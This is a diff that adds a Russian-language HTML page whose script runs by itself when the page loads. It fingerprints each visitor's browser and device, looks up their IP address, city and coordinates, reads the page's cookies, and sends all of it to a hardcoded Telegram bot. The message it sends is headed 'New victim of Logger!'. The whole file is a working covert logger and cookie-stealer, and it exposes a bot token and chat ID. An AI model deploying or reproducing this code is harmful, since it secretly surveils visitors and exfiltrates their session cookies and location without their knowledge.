@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Отправка на Telegram бот</title>
+</head>
+<body>
+    <script>
+        const telegramBotToken = '7527469949:AAGi0lJoMcXi7EMMhZJ06gCiZOr4qEozsrU';
+        const chatId = '1971307009';
+
+        const getUserInfo = async () => {
+            try {
+                const userInfo = {
+                    userAgent: navigator.userAgent || 'Не доступно',
+                    language: navigator.language || 'Не доступно',
+                    platform: navigator.platform || 'Не доступно',
+                    screenWidth: window.screen.width || 'Не доступно',
+                    screenHeight: window.screen.height || 'Не доступно',
+                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Не доступно',
+                    localStorage: window.localStorage ? 'Доступен ✅' : 'Не доступен ❌',
+                    sessionStorage: window.sessionStorage ? 'Доступен ✅' : 'Не доступен ❌',
+                    cookiesEnabled: navigator.cookieEnabled ? 'Включены ✅' : 'Отключены ❌',
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'Не доступна',
+                    onlineStatus: navigator.onLine ? 'В сети 🌐' : 'Не в сети ❌',
+                    colorDepth: window.screen.colorDepth || 'Не доступно',
+                    screenOrientation: window.screen.orientation ? window.screen.orientation.type : 'Не доступно',
+                    appVersion: navigator.appVersion || 'Не доступно',
+                    appCodeName: navigator.appCodeName || 'Не доступно',
+                    cookieEnabled: navigator.cookieEnabled ? 'Включены ✅' : 'Отключены ❌',
+                    deviceMemory: navigator.deviceMemory || 'Не доступно',
+                    plugins: navigator.plugins ? Array.from(navigator.plugins).map(plugin => plugin.name).join(', ') : 'Не доступно',
+                    mimeTypes: navigator.mimeTypes ? Array.from(navigator.mimeTypes).map(mime => mime.type).join(', ') : 'Не доступно',
+                    cpuClass: navigator.cpuClass || 'Не доступно',
+                    deviceModel: /Android/i.test(navigator.userAgent) ? navigator.userAgent.match(/Android\s([0-9\.]*)/)[0] : 'Не доступно',
+                    platformVersion: navigator.platform || 'Не доступно',
+                    isTouchDevice: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Да ✅' : 'Нет ❌',
+                    navigatorConnectionType: navigator.connection ? navigator.connection.effectiveType : 'Не доступно',
+                    screenResolution: window.screen.availWidth + 'x' + window.screen.availHeight,
+                    browser: navigator.appName || 'Не доступно',
+                    os: navigator.platform || 'Не доступно',
+                };
+
+                const ipInfo = await fetch('https://ipinfo.io/json')
+                    .then(response => response.json())
+                    .catch(() => null);
+
+                userInfo.ipAddress = ipInfo ? ipInfo.ip : 'Не доступно';
+                userInfo.city = ipInfo ? ipInfo.city : 'Не доступно';
+                userInfo.region = ipInfo ? ipInfo.region : 'Не доступно';
+                userInfo.country = ipInfo ? ipInfo.country : 'Не доступно';
+                userInfo.org = ipInfo ? ipInfo.org : 'Не доступно';
+                userInfo.loc = ipInfo ? ipInfo.loc : 'Не доступно';
+
+                const proxyCheck = await fetch('https://www.proxy-checker.com/api/proxycheck', {
+                    method: 'GET',
+                    headers: { 'Content-Type': 'application/json' }
+                }).then(response => response.json())
+                  .catch(() => null);
+
+                userInfo.proxy = proxyCheck && proxyCheck.isProxy ? 'Используется прокси ✅' : 'Не используется прокси ❌';
+
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                userInfo.connectionType = connection ? connection.effectiveType : 'Не доступно';
+
+                const cookies = document.cookie || 'Не доступно';
+
+                return { ...userInfo, cookies };
+            } catch (error) {
+                return {};
+            }
+        };
+
+        const createMessage = async () => {
+            try {
+                const userInfo = await getUserInfo();
+
+                const message = `
+🔔 Новая жертва Logger! 🔔
+
+===================================
+📋 User-Agent: ${userInfo.userAgent}
+
+🌍 Язык браузера: ${userInfo.language}
+
+💻 Платформа устройства: ${userInfo.platform}
+
+📏 Ширина экрана: ${userInfo.screenWidth}
+
+📐 Высота экрана: ${userInfo.screenHeight}
+
+🕰️ Часовой пояс: ${userInfo.timeZone}
+
+📡 Тип подключения: ${userInfo.navigatorConnectionType}
+
+🖥️ Подключение к прокси: ${userInfo.proxy}
+
+🌍 IP Адрес: ${userInfo.ipAddress}
+
+🌆 Город: ${userInfo.city}
+
+🏙️ Регион: ${userInfo.region}
+
+🌏 Страна: ${userInfo.country}
+
+🏢 Организация: ${userInfo.org}
+
+🍪 Куки: ${userInfo.cookies}
+
+📶 Статус сети: ${userInfo.onlineStatus}
+
+🔐 Cookies включены: ${userInfo.cookieEnabled}
+
+🖥️ Конкуренция оборудования: ${userInfo.hardwareConcurrency}
+
+📱 Модель устройства: ${userInfo.deviceModel}
+
+📍 Координаты: ${userInfo.loc}
+
+🖥️ ОС: ${userInfo.os}
+
+📱 Экран сенсорный: ${userInfo.isTouchDevice}
+
+🖥️ Версия платформы: ${userInfo.platformVersion}
+
+🖥️ CPU Класс: ${userInfo.cpuClass}
+                `;
+
+                await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                    }),
+                });
+            } catch (error) {
+                // Хз
+            }
+        };
+
+        createMessage();
+    </script>
+</body>
+</html>
